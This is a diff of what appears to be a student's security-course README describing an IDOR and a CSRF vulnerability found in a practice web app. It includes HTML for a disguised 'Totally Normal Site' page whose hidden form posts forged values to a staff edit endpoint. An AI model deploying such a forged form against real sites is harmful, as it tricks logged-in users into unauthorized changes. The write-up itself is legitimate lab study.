@@ -39,18 +39,21 @@ Vulnerability #2: Cross-Site Scripting (XSS)
 ## Red
 
 Vulnerability #1: Insecure Direct Object Reference (IDOR)
+* By changing the value of "id" in the URL, a visitor is able to view pages/information that was meant to be private
 
 <img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/idor.gif">
 
 Vulnerability #2: Cross-Site Request Forgery (CSRF)
+* Forged a form using the code below. Then allowed a logged-in user to visit the page, resulting in a CSRF POST request attack
 
 ```
 <html>
   <head>
   </head>
   <body>
-	<h1><center>Totally Normal Site</center></h1>
-    	<form name="csrfForm" action="https://35.184.21.59/red/public/staff/salespeople/edit.php?id=1" method="post" target="hide">
+  	<h1><center>Totally Normal Site</center></h1>
+    	<form name="csrfForm" action="https://35.184.21.59/red/public/staff/salespeople/edit.php?id=1" 
+	method="post" target="hide">
 
 		<input type="hidden" name="first_name" value="Site Hacked">
 		<input type="hidden" name="last_name" value="By Brian">
